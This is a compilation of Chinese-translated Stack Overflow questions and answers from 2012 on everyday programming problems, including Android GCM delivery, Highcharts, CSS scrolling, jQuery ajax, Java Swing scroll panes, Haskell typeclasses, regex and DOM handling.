> 时间：2012-08-17T23:34:40.143
> 
> 标签：c#, android, push, google-cloud-messaging

我正在尝试通过 GCM 将推送消息传递到我在调试模式下本地连接到桌面的 Android 设备。我可以在 GCM 上注册并取回注册 ID。但是，当我从服务器向 GCM 发送消息时，它永远不会到达我的设备。任何想法这里缺少什么？

这是我用来向 GCM 发送消息的 C# 代码：

```
 wc.Headers.Add("Authorization", "key=" + senderAuthToken);
                var nameValues = new NameValueCollection
                                     {
                                         {"registration_id", registrationId},
                                         {"collapse_key", Guid.NewGuid().ToString()},
                                         {"data.payload", HttpUtility.UrlEncode(message)}
                                     };
                var resp = wc.UploadValues("https://android.googleapis.com/gcm/send", nameValues);
                var respMessage = Encoding.Default.GetString(resp); 
```

这是我从 GCM 得到的回复：

**id=0:1345244000449737%276b04adef6fbb69**

所以看起来消息正在验证并在 GCM 中排队。

这是我的 AndroidManifest.xml：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="fiserv.mobile.poc"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="10"
    android:targetSdkVersion="15" />

<permission android:name="fiserv.mobile.poc.permission.C2D_MESSAGE" 
    android:protectionLevel="signature"/>

<uses-permission android:name="fiserv.mobile.poc.permission.C2D_MESSAGE" /> 

<!-- App receives GCM messages. -->
<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
<!-- GCM connects to Google Services. -->
<uses-permission android:name="android.permission.INTERNET" /> 
<!-- GCM requires a Google account. -->
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
<!-- Keeps the processor from sleeping when a message is received. -->
<uses-permission android:name="android.permission.WAKE_LOCK" />  

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <receiver android:name="com.google.android.gcm.GCMBroadcastReceiver" 
        android:permission="com.google.android.c2dm.permission.SEND" >
      <intent-filter>
        <action android:name="com.google.android.c2dm.intent.RECEIVE" />
        <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
        <category android:name="fiserv.mobile.poc" />
      </intent-filter>
    </receiver>

    <service android:name=".GCMIntentService" />

</application> 
```

这是我的 GCMIntentService.java 服务：

```
package fiserv.mobile.poc;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService extends GCMBaseIntentService {

    @Override
    protected void onError(Context arg0, String arg1) {
        Log.e("Registration", "Got an error!");
        Log.e("Registration", arg0.toString() + arg1.toString());
    }

    @Override
    protected void onMessage(Context arg0, Intent arg1) {
        Log.i("Registration", "Got a message!");
    }

    @Override
    protected void onRegistered(Context arg0, String arg1) {
        Log.i("Registration", "Just registered!");
        Log.i("Registration", arg0.toString() + arg1.toString());   

    }

    @Override
    protected void onUnregistered(Context arg0, String arg1) {
    }
} 
```

最后是我的 MainActivity.java：

```
package fiserv.mobile.poc;

import fiserv.mobile.poc.R;

import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.Menu;

import com.google.android.gcm.GCMRegistrar;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        RegisterWithGCM();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    private void RegisterWithGCM()
    {           
        GCMRegistrar.checkDevice(this);
        GCMRegistrar.checkManifest(this);
        final String regId = GCMRegistrar.getRegistrationId(this);
        if (regId.equals("")) {
          GCMRegistrar.register(this, SENDER_ID);
        } else {

          Log.v("Registration", "Already registered, regId: " + regId);
        }
    }

    String SENDER_ID = "158778556981";
} 
```

当我向 GCM 注册时，我可以看到日志语句，但`onMessage`无论我向 GCM 发送多少消息，我都没有点击或看到日志语句“收到消息！”。我已验证我正在使用与我在 Android 应用程序中使用的“发件人 ID”匹配的服务密钥。

任何想法为什么没有传递消息？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-20T16:11:56.893

您必须**有一个 Google 帐户登录到您的设备**。我没有收到通知的原因是因为我在开始测试 GMC 之前更改了我的 Google (Gmail) 密码。更新密码后，我开始在我的设备上收到通知。

在 android 2.2 上，设置 > 帐户部分没有“更新密码”按钮。我不得不去 Play 应用程序然后尝试下载一个应用程序，然后它要求输入新密码。

# highcharts - HighCharts：根据另一个系列的 X 值在一个系列中获取 Y 值

> ID：12014412
> 
> 赞同：2
> 
> 时间：2012-08-17T23:35:03.287
> 
> 标签：highcharts

我在一个有 2 个不同系列的 HighCharts 设置上编写一个点击事件，一个在另一个之上。我希望该事件始终在顶部系列上显示一条消息，即使他们单击底部系列也是如此。

我正在使用以下代码：

```
chart = new Highcharts.StockChart({
  chart: {
    renderTo: 'container',
    events: {
      click: function(event) {
        // perform actions

        this.chart.series[1].setData([{
          x: event.point.x,
          y: ??
        }]);
      }

... 
```

我想要做的是根据他们在图表上单击位置的 X 值使用第一个系列的 Y 值。如何根据此信息查找 Y 值？

基本上，如果我单击图表上的一个点，我如何仅根据它的 X 值在图表上查找一个系列中的一个点。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-18T07:40:50.223

系列对象有一个点对象数组，它基本上包含该系列中的所有点，一旦您从事件对象中获取给定系列的 xValue，您可以遍历这些点以找到最接近的点`x`并返回其对应的`y`值

代码片段：

```
function getYValue(chartObj,seriesIndex,xValue){
 var yValue=null;
 var points=chartObj.series[seriesIndex].points;
 for(var i=0;i<points.length;i++){
    if(points[i].x>=xValue)break;
    yValue=points[i].y;
 }
 return yValue;    
} 
```

用法：

```
 click:function(evt){
      var seriesIndex=1;
      var xAxisIndex=0;
      // All you need is the index of the series that you want
      // And the index of the xAxis bound to that series
      // default to 0 if you have only one series
      alert(getYValue(this,seriesIndex,evt.xAxis[xAxisIndex].value));
 } 
```

小提琴@http [://jsfiddle.net/jugal/3MVGF/](http://jsfiddle.net/jugal/3MVGF/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-07T19:25:26.277

这应该纠正一些带有负面点和点的错误`xValue=0`

```
function getyValue(chartObj,seriesIndex,xValue){
    var yValue=null;
    var points=chartObj.series[seriesIndex].points;
    for(var i=0;i<points.length;i++){
        if(points[i].x>xValue)
        {
            break;
        }
        else{
            if(points[i].x==xValue)
            {
                yValue=points[i].y;
                break;
            }
        }
        yValue=points[i].y;
    }
    return yValue;    
} 
```

# javascript - 浏览器中的滚动位置 (scrollTop) 硬件是否加速？

> ID：12014413
> 
> 赞同：12
> 
> 时间：2012-08-17T23:35:07.197
> 
> 标签：javascript, performance, html, css, gpu

我最初的猜测是答案是否定的，因为这里提供的证据：

[https://github.com/inuyaksa/jquery.nicescroll/wiki/Native-scroll-vs-Hardware-accelerated-one](https://github.com/inuyaksa/jquery.nicescroll/wiki/Native-scroll-vs-Hardware-accelerated-one)

我可以定性地注意到“硬件加速”版本在我的计算机上滚动更流畅。我运行一个 120Hz 的显示器。这表明第二种方法更快、更有效。

对于 HTML 元素，例如

```
<div id="a" style="overflow-y: hidden; height: 100px">
    Content <em>which exceeds 100px in height</em>
    <img src='lolcat.png' alt='lolcat'/>
</div> 
```

我想实现 3D 硬件加速布局的一种简单方法是渲染 div 的全高，然后将此输出作为全高的纹理加载，然后用于渲染实际 div 的纹理坐标将显示一次只有100px。

我的问题与`scrollTop`属性在理论上应该如何做到这一点有关，但目前似乎有更好的机会通过使用两个元素来获得我描述的行为，如下所示：

```
<div id="a" style="overflow-y: hidden; height: 100px; position: relative">
    <div style="position: relative">
        Content <em>which exceeds 100px in height</em>
        <img src='lolcat.png' alt='lolcat'/>
    </div>
</div> 
```

我没有设置`scrollTop`属性，`document.getElementById('a')`而是将 CCS3`-webkit/moz/ms/o-transform`属性设置为具有相应负 Y 轴像素值的 3D 值。

**使用 CSS3 进行滚动的最有效方法是什么？**特别是，我如何构建我的 DOM 以最有可能获得最直接的滚动实现（在滚动元素时不会导致重新绘制内部内容）？

更新：我一直在用一个很不错的Chrome的平滑滚动插件，好像是用JS在页面上分配scrollTop偏移量来实现滚动渲染，这似乎说明如果这不是硬件加速的话，性能就不行了在没有大量 CPU 使用的情况下，真正跟上屏幕刷新率 (120Hz)。尽管如此，这种推测仍然极不科学。在这一点上我要得出的结论是，浏览器可以自由地加速他们在合理范围内选择的任何东西，所以答案是一个响亮的*可能*。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-23T04:37:00.567

根据您提到的页面，硬件加速取决于浏览器是否支持硬件加速。

> 带有包装器的 Div 可以被硬件加速。（如果浏览器支持的话）

所以我认为你嵌套两个 div 的想法将创造一种更简单的方法来实现你想要的。但是要回答您的问题，`scrollTop`只有在支持硬件加速的浏览器中才能进行硬件加速。

1.  **Firefox 4.0 beta 5**支持硬件加速。
2.  **IE 9 beta**支持硬件加速。
3.  **Chrome 6+**支持*硬件加速合成*。

~~Safari 和 Opera 尚未支持硬件加速。~~

这是根据 2010 年的此页面。[http://www.webmonkey.com/2010/09/a-guide-to-hardware-acceleration-in-modern-browsers/](http://www.webmonkey.com/2010/09/a-guide-to-hardware-acceleration-in-modern-browsers/)

根据[http://arstechnica.com/information-technology/2012/06/opera-12-arrives-with-webcam-apis-and-experimental-webgl-support/](http://arstechnica.com/information-technology/2012/06/opera-12-arrives-with-webcam-apis-and-experimental-webgl-support/)， **Opera 12**支持硬件加速。

据 TechCrunch 报道，**适用于 Windows 的 Safari 5**支持硬件加速。

根据 Apple Safari 的网站，**Safari 6**支持硬件加速。

对不起！我有指向 TechCrunch 文章和 Safari 网站的链接，但我只能使用两个超链接。

**编辑：**

为了更好地回答这个问题，我补充了这个问题。**使用 CSS3 进行滚动最有效的方法是`overflow: scroll;`或`overflow-x: scroll;`.** `overflow:`CSS 属性比使用 JavaScript 的 jQuery 标记`scrollTop`更有效。`scrollTop`所以使用`scrollTop`的不是 CSS，而是 JavaScript。此外，使用 CSS 也是实现水平滚动最直接的方法，因为它不需要导入 jQuery 库或启用 JavaScript。

我完全同意您的看法，即通过使用两个`div`标签和 CSS 而不是使用 jQuery/JavaScript 来获得您所描述的行为的机会要大得多。

**除非**，您希望能够自动滚动到另一个位置，使用时`scrollTop`您可以通过使用按钮或链接有效地滚动到不同的位置。

```
$(document).ready(function() {
    $('a[href=#top]').click(function(){
        $('html, body').animate({scrollTop:0}, 'slow');
        return false;
    });
}); 
```

这个 jQuery 代码使用`scrollTop`使所有`<a href="#top">top</a>`动画滚动到顶部而不是仅仅跳跃。使用 CSS 滚动时，您不会得到这些动画滚动。`div`此外，您可以通过设置多个标签的 ID 并编辑上述代码以满足您的需要，使用此方法水平或垂直滚动​​到不同的点。这是来自[http://www.electrictoolbox.com/jquery-scroll-top/](http://www.electrictoolbox.com/jquery-scroll-top/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-11-07T00:32:36.417

`scrollTop`不是硬件加速的。我发现即使在移动设备上也能产生平滑滚动的最佳方法是强制 css3 硬件加速与过渡相结合。

我假设你有 jQuery，所以为了清楚起见，我使用该语法，我所做的只是设置 css 属性和其他基本调用。

```
var $body = $('body');
function scrollTop(scrollPosition) {
    // account for the current scroll position
    var scrollDiff = $body.scrollTop() - scrollPosition;

    // use css transition
    $body.css('transition', '.5s');

    // translate3d forces hardware acceleration, second param is 'y'
    $body.css('transform', 'translate3d(0, ' + scrollDiff + 'px, 0)');

    // revert back to native scrollTop
    $body.bind('transitionend webkitTransitionEnd', function(event) {
        $body
        .scrollTop(scrollPosition)
        .css({'transition': '', 'transform': ''})
        .unbind(event);
    });
} 
```

注意：我确实注意到该`transitionend`事件在移动设备上并不总是可靠的；这使得代码的“恢复到本机 scrollTop”部分出现故障。我认为最好的方法是更进一步，在不使用 scrollTop 的情况下实现自己的滚动条。第二个参数`translate3d()`除以容器的高度将是滚动条相对于轨迹栏的位置（百分比）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T05:46:27.710

`document.getElementById("a").scrollTop`效率更高，因为它存在的时间更长。浏览器已经有超过 10 年的时间来优化它。

# javascript - 我如何知道 .ajax 是使用 Get 还是 POST

> ID：12014416
> 
> 赞同：-1
> 
> 时间：2012-08-17T23:35:31.953
> 
> 标签：javascript, jquery, ajax

我在用

```
$.ajax({
        url: "http://twitter.com/status/user_timeline/treason.json?count=10&callback=?",

        success: function (data, textStatus, jqXHR) {
                        },
        error: function (jqXHR, textStatus, errorThrown) {
        },
        dataType: "jsonp"
 }); 
```

我怎么知道它使用的是 GET 还是 POST？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:37:59.547

默认情况下它是**GET**

**您可以通过指定类型**参数值来覆盖它。

```
$.ajax({
         url: "someurl",
         type:"POST"
      }); 
```

您还可以在方法中全局设置它，[`$.ajaxSetup`](http://api.jquery.com/jQuery.ajaxSetup/)以便所有 ajax 调用都使用该设置，除非覆盖它。

```
$.ajaxSetup({
  type: 'POST'
}); 
```

因此，如果您没有`$.ajaxSetup`设置它的部分，您的问题的答案是**GET**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:46:30.907

That's really simply, as the dataType is set to JSONP, and JSONP and cross domain requests inserts a script tag in the page to get the data, and as such it ONLY supports GET requests. POST requests aren't possible with a dataType of JSONP, so even if you specify POST as the type, jQuery will always use GET for those kind of Ajax calls, it's not possible to override that "feature".

# c# - 我可以为 Html Helper 调用具有多个参数的 Lambda 表达式吗？

> ID：12014417
> 
> 赞同：0
> 
> 时间：2012-08-17T23:35:41.607
> 
> 标签：c#, asp.net, asp.net-mvc-3, lambda, html-helper

我可以在 MVC 3 中创建这样的代码行吗

```
<%=Html.CustomHtmlTag(r => r.Add("One"), r.Add("Two")...).Render()%> 
```

我尝试查找和示例，但所有代码都是为了`(r => r.Add("One"))`

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T00:29:57.683

您可以通过简单地放置大括号来使用 lambdas 编写完整的函数。

```
r =>
{
    r.Add("One");
    r.Add("Two");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:18:01.577

@VoidStar 提供的答案是正确的，如果你在这里很糟糕，这是一个更详细的例子。

**MVC 代码**

```
@Html.CustomHtmlTag(Model, x => { 
                                    Model.Add("One"); 
                                    Model.Add("Two");
                                    Model.Add("Three");
                                    Model.Add("Four");
                                }).Render() 
```

**模型**

```
public class MyModel
{
    private readonly IList<string> _values = new List<string>();

    public void Add(string value)
    {
        _values.Add(value);
    }

    public string ValuesToString()
    {
        return string.Join(",", _values);
    }
} 
```

**HTML 助手**

```
public static class MyMvcHelpers
{
    public static IMyClass CustomHtmlTag(this HtmlHelper helper, MyModel viewModel, Action<MyModel> action)
    {
        action.Invoke(viewModel);

        var expressionResult = viewModel.ValuesToString();

        return new MyClass(expressionResult);
    }
} 
```

**渲染类**

```
public interface IMyClass
{
    MvcHtmlString Render();
}

public class MyClass : IMyClass
{
    private readonly string _value;

    public MyClass(string value)
    {
        _value = value;
    }

    public MvcHtmlString Render()
    {
        return new MvcHtmlString(string.Concat("<h1>", _value, "</h1>"));
    }
} 
```

**结果**

```
<h1>One,Two,Thee,Four</h1> 
```

# java - 为什么在对此调用方法时会收到 NullPointerException？

> ID：12014418
> 
> 赞同：0
> 
> 时间：2012-08-17T23:35:41.623
> 
> 标签：java, nullpointerexception

我在当前对象上有一个带有参数的方法。调用该方法会抛出一个`NullPointerException`，即使`this` *根据定义*一定不能是`null`。

```
private String doSomething(int i){
   return "I";
} 
```

调用：

```
Integer i = null;
String s = this.doSomething(i); 
```

`NullPointerException`如果我没有引用一个`null`对象，为什么会有一个？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:36:49.173

在这种情况下，JVM 内部抛出 a`NullPointerException`因为无法将 a 转换`Integer i`为`int i`. 在这种情况下`Integer`，它当然对[原始数据类型](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)`null`无效。 `int`

[根据规范](http://jcp.org/aboutJava/communityprocess/jsr/tiger/autoboxing.html)，这不是允许的转换，并在[Java 1.5 指南中](http://docs.oracle.com/javase/1.5.0/docs/guide/language/autoboxing.html)注明。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:39:44.903

JVM 尝试将 null 自动装箱为 int 并因 NPE 而失败。

# haskell - 类型类挑战：同时具有可变参数和结果

> ID：12014420
> 
> 赞同：9
> 
> 时间：2012-08-17T23:36:03.200
> 
> 标签：haskell, typeclass, quickcheck

在编写一些`Arbitrary`实例时，我使用以下非常机械的模式实现了几个函数：

```
type A = Arbitrary -- to cut down on the size of the annotations below
shrink1 :: (A a          ) => (a           -> r) -> (a           -> [r])
shrink2 :: (A a, A b     ) => (a -> b      -> r) -> (a -> b      -> [r])
shrink3 :: (A a, A b, A c) => (a -> b -> c -> r) -> (a -> b -> c -> [r])

shrink1 f a     = [f a'     | a' <- shrink a]
shrink2 f a b   = [f a' b   | a' <- shrink a] ++ [f a b'   | b' <- shrink b]
shrink3 f a b c = [f a' b c | a' <- shrink a] ++ [f a b' c | b' <- shrink b] ++ [f a b c' | c' <- shrink c] 
```

我手动将这些函数写到 ，`shrink7`这似乎足以满足我的需要。但我不禁想知道：这可以合理地自动化吗？解决方案的奖励积分：

*   允许`shrink0 f = []`
*   生成所有的收缩器
*   有很多类型类黑客，我喜欢
*   跳过可怕的扩展，如不连贯/不可判定/重叠的实例
*   让我也吃蛋糕：不需要我在传递它时 uncurry或在应用它时`f`curry 应用程序，和`shrinkX f``a``b``c`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-18T00:35:35.103

这编译，我希望它有效：

```
{-# LANGUAGE TypeFamilies #-}
import Test.QuickCheck

class Shrink t where
  type Inp t :: *
  shrinkn :: Inp t -> t
  (++*) :: [Inp t] -> t -> t

instance Shrink [r] where
  type Inp [r] = r
  shrinkn _ = []
  (++*) = (++) 

instance (Arbitrary a, Shrink s) => Shrink (a -> s) where
  type Inp (a -> s) = a -> Inp s
  shrinkn f a = [ f a' | a' <- shrink a ] ++* shrinkn (f a)
  l ++* f = \b -> map ($ b) l ++* f b 
```

`(++*)`仅用于实现收缩。

抱歉，相对缺乏类型类黑客。为类型递归提供了一个很好的`[r]`停止条件，因此不需要hackery。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-18T07:08:08.130

我怀疑在这种情况下你可以避免可怕的扩展，但除此之外：

```
{-# LANGUAGE MultiParamTypeClasses, FlexibleInstances, TypeFamilies,
 UndecidableInstances, IncoherentInstances #-}

import Test.QuickCheck

class Shrinkable a r where
    shrinkn :: a -> r

instance (Shrinkable [a -> b] r) => Shrinkable (a -> b) r where
    shrinkn f = shrinkn [f]

instance (Arbitrary a, Shrinkable [b] r1, r ~ (a -> r1)) => Shrinkable [a -> b] r where
    shrinkn fs@(f:_) a =
        let fs' = [f a | f <- fs]
        in shrinkn $ fs' ++ [f a' | a' <- shrink a]

instance (r ~ [a]) => Shrinkable [a] r where
    shrinkn (_:vs) = vs

instance (r ~ [a]) => Shrinkable a r where
    shrinkn e = [] 
```

以下是一些用于测试示例函数的 Quickcheck 属性：

```
prop0 a = shrinkn a == []

prop1 a = shrink1 not a == shrinkn not a 

prop2 a b = shrink2 (++) a b == shrinkn (++) a b 

f3 a b c = if a then b + c else b * c 
prop3 a b c = shrink3 f3 a b c == shrinkn f3 a b c 
```

# iphone - 一个基本的 UITabBar 应用程序

> ID：12014423
> 
> 赞同：0
> 
> 时间：2012-08-17T23:36:08.080
> 
> 标签：iphone, ios, uitabbarcontroller

我正在创建一个非常基本的 iOS 应用程序。我有一个带有 5 个选项卡的 TabViewController，我想从每个选项卡创建子页面。最好的方法是什么？我应该使用更多选项卡还是可以使用将继承选项卡栏的 ViewController？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:08:33.457

通过子页面，您是指将新页面推入堆栈，还是在当前页面之上显示新页面？

在前者的情况下，您希望将 UINavigationController 作为选项卡的视图控制器传递，并将该选项卡的原始视图控制器作为导航控制器的 RootViewController。

在后者的情况下，您可以使用当前视图控制器的 presentModalViewController 方法来呈现一个新的视图控制器。

# java - JScrollPane 和 JPanel

> ID：12014427
> 
> 赞同：4
> 
> 时间：2012-08-17T23:36:23.577
> 
> 标签：java, swing, jpanel, jscrollpane

所以，我正在制作一种文本编辑器，我需要一个用于垂直导航的 JScrollPane。但我无法让它工作。

我已经阅读了谷歌搜索结果前十页上的每一个该死的教程，但我无法让它工作。

假设我有 JFrame（尺寸 1000x800）。我想在其中放置一个 JPanel (1000x2000)，使其与 JFrame 水平对齐。我想在 JPanel 的右侧粘贴一个简单的滚动条，这样我就可以看到它的其余部分。

我减小了尺寸，我将 JPanel 添加到 JScrollBar，反之亦然，将其中一个添加到 JFrame，两者都没有，但什么都没有。

所以，在这一点上，我不介意几行完成的代码......

编辑：好的，这是代码......

```
mWindow = new JFrame(lang.getString("title"));
mWindow.setSize(1000, 800);
mWindow.setLocationRelativeTo(null);
mWindow.setResizable(false);
mWindow.setLayout(null);
mWindow.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

mWindow.setVisible(true);

workspace = new JPanel();
workspace.setBounds(0,0, 1000, 1203);
workspace.setBackground(Color.RED);

scroll = new JScrollPane(workspace, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
scroll.setBounds(0, 20, 600, 600);
//scroll.setLayout(null);
mWindow.getContentPane().add(scroll);
mWindow.repaint();
mWindow.validate(); 
```

显示 JPanel 的一部分（600X600，（JScrollPane 大小）），并显示滚动条，但不可滚动

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-18T00:32:30.647

所以，我做了这个非常快速的测试，它对我来说很好......

```
public class TestPane extends JPanel {

    public TestPane() {

        setBorder(new LineBorder(Color.RED));
        // This is for demonstration purposes only
        // One should always rely on the layout manager
        // to define this value
        // Thank kleopatra 
        setPreferredSize(new Dimension(1000, 1000));

    }

    @Override
    protected void paintComponent(Graphics g) {

        super.paintComponent(g);

        FontMetrics fm = g.getFontMetrics();

        Dimension size = getPreferredSize();
        String text = "Pref: " + size.width + "x" + size.height;
        g.drawString(text, 0, fm.getAscent());

        size = getSize();
        text = "Size: " + size.width + "x" + size.height;
        g.drawString(text, 0, fm.getHeight() + fm.getAscent());

    }

} 
```

和测试框架

```
public class TestFrame {

    public static void main(String args[]) {

        JFrame frame = new JFrame();
        frame.setLayout(new BorderLayout());

        JScrollPane scroll = new JScrollPane(new TestPane());

        frame.add(scroll);

        frame.setSize(500, 500);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

    }

} 
```

产生这个：

![滚开](../Images/acb574db910d3f0272b3b32e5d34e219.png)

在旁注中，我不知道为什么人们坚持使用空布局，它们只会造成更多的麻烦和心痛，而不是它们的价值。花点时间找一些简单的布局管理器。我讨厌 VB 有很多原因，但布局管理是我的首要任务，恕我直言

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:57:39.453

申请试试

```
setPreferredSize(new Dimension()); 
```

面板上的方法，而不是 setSize() 方法。

像这样：

```
import java.awt.Dimension;

import javax.swing.*;
public class Example extends JFrame{

public static void main(String[] args) {
    Example ex = new Example();
    JPanel panel = new JPanel();
    JScrollPane sc = new JScrollPane(panel);
    panel.setPreferredSize(new Dimension(800,600));
    ex.getContentPane().add(sc);
    ex.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    ex.pack();
    ex.setVisible(true);
}

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T00:37:08.157

我会做：

1.  边框布局，使滚动窗格适合框架内容窗格的所有空间；
2.  最后一个包用于布局；
3.  最后设置可见；
4.  setPreferredSize 如果没有任何帮助。

    ```
    mWindow = new JFrame(lang.getString("title"));
    mWindow.setSize(1000, 800);
    mWindow.setLocationRelativeTo(null);
    mWindow.setResizable(false);
    mWindow.setLayout(new BorderLayout());
    mWindow.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    workspace = new JPanel();
    workspace.setBounds(0,0, 1000, 1203);
    workspace.setPreferredSize(new Dimension(1000,1203));

    workspace.setBackground(Color.RED);

    scroll = new JScrollPane(workspace, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
    scroll.setBounds(0, 20, 600, 600);
    mWindow.getContentPane().add(scroll, BorderLayout.CENTER);
    mWindow.pack();
    mWindow.setVisible(true); 
    ```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T20:31:47.327

为什么不尝试这样的事情并从创建框架的类中调用它。

```
public JPanel createLPanelWithScroller() {

      Dimension outter_dem = new Dimension(600, 600); //width,height
      Dimension inner_panel_dem = new Dimension(1000, 1203);  
      Dimension scroll_dem = new Dimension(600, 600); 

      JPanel outter_panel = new JPanel(new FlowLayout());
 outter_panel.setPreferredSize(outter_panel_dem);       

 JPanel inner_panel = new JPanel(new FlowLayout());
 inner_panel.setPreferredSize(inner_panel_dem);

 JScrollPane scroller = new JScrollPane(list_panel); 
 scroller.setHorizontalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
      scroller.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS);
 scroller.setPreferredSize(scroll_dem);

 outer_panel.add(list_scroller);

 return outer_panel;
} 
```

# php - 如果 PHP 脚本超时后备？

> ID：12014428
> 
> 赞同：0
> 
> 时间：2012-08-17T23:36:29.267
> 
> 标签：php

我正在创建一个读取 Wikipedia 文章的脚本，然后进行一些处理。我正在使用 cURL 访问文章内容。问题是，有时 cURL 请求会超时，尤其是在大型文章上。由于此脚本将在其上运行的服务器最多允许 30 秒超时，因此这是一个问题。

我能想到的唯一解决方法是——如果特定的代码行接近超时限制——杀死函数并运行其他东西。就我的目的而言，这将是解决该问题的一个不错的方法。问题是，我不知道这是可能的。

是吗？如果没有，对于超时 cURL 请求是否还有其他解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:40:12.300

这应该会在 PHP 脚本终止前 10 秒终止您的 curl 函数：

```
curl_setopt($mycurlobject, CURLOPT_TIMEOUT, 20) 
```

# regex - 如何匹配“abc？def？” 但不是“abc??def?”

> ID：12014432
> 
> 赞同：0
> 
> 时间：2012-08-17T23:37:20.747
> 
> 标签：regex

我正在尝试以下操作：

```
.+\?[^\?].+\? 
```

也就是说，匹配所有内容直到一个“？”，然后，如果没有其他“？” 之后，匹配所有内容直到另一个“？”。我猜它不起作用，因为第一个 .+ 已经匹配整个字符串。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:48:57.197

您的描述不准确，但这是我假设您需要正则表达式来满足的规则：

1.  零个或多个不是“？”的字符
2.  一种 '？'
3.  一个或多个不是“？”的字符
4.  一种 '？'

这实际上很简单。

```
[^?]*\?[^?]+\? 
```

请注意，这将匹配较大字符串的子字符串。如果您需要确保整个字符串与此完全匹配，请输入`^`并`$`锚定：

```
^[^?]*\?[^?]+\?$ 
```

* * *

解释：

1.  `^`

    字符串的开始。在多行上下文中，这也匹配行首，但您可能不在多行上下文中。

2.  `[^?]`

    匹配任何不是文字字符 ' `?`' 的内容。

3.  `*`

    匹配零个或多个前一个标记。

4.  `\?`

    匹配文字' `?`'。

5.  `[^?]`

    匹配任何不是文字字符 ' `?`' 的内容。

6.  `+`

    匹配一个或多个前一个标记。这样可以确保您不能`?`连续有两个 ' '。

7.  `\?`

    匹配文字' `?`'。

8.  `$`

    匹配字符串的结尾（或多行上下文中的行结尾）。

* * *

`?`注意：我假设在第一个''之前有零个或多个非' `?`'。这将匹配类似`?abc?`. 如果这是非法的，请将第`*`一个更改为`+`.

# javascript - 遍历 DOM 中的属性

> ID：12014439
> 
> 赞同：3
> 
> 时间：2012-08-17T23:37:55.240
> 
> 标签：javascript

> **可能重复：**
> [使用 Javascript/jQuery 从 HTML 元素中获取所有属性](https://stackoverflow.com/questions/2048720/get-all-attributes-from-a-html-element-with-javascript-jquery)

我需要检索 DOM 元素的所有属性。方法我看过`getAttribute()`，但事先不知道属性的名称。如果我`getElementById()`用来检索一个元素，那么我如何访问该元素的所有属性及其值？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-17T23:40:16.863

每个 DOM 节点都有一个`attributes`属性，它是一个 NamedNodeMap（本质上是一个具有一些额外功能的数组）。特别是这意味着您可以获取`elem.attributes.length`并循环通过它们。

每个单独的属性都是一个 Attr 对象，它具有（除其他外）`name`和`value`属性。

请注意，IE7 及以下版本有一个可能定义的所有属性的列表（总共 84 个），无论它们实际上是否在元素上。在实际包含属性值之前，您可能希望快速检查虚假值。

# javascript - 使用 JavaScript 删除标签之间的每个空格

> ID：12014441
> 
> 赞同：13
> 
> 时间：2012-08-17T23:37:58.737
> 
> 标签：javascript, regex, whitespace

我正在尝试删除标签之间的空白，以便 childNodes 只包含那些标签节点而不是空白节点。这是我的代码：

```
<li>            
    <label for="firstName"  class="mainLabel">First Name : </label>                                 
    <input type="text" name="firstName" id="firstName"/>                                    
    <span>This must be filled</span>
</li> 
```

这是JS代码：

```
var parentHTML = firstName.parentNode.innerHTML;
parentHTML = parentHTML.replace(/>\n</g,"><");
firstName.parentNode.innerHTML = parentHTML; 
```

但是当我发出警报时，`parentHTML`我得到了相同的旧字符串。

* * *

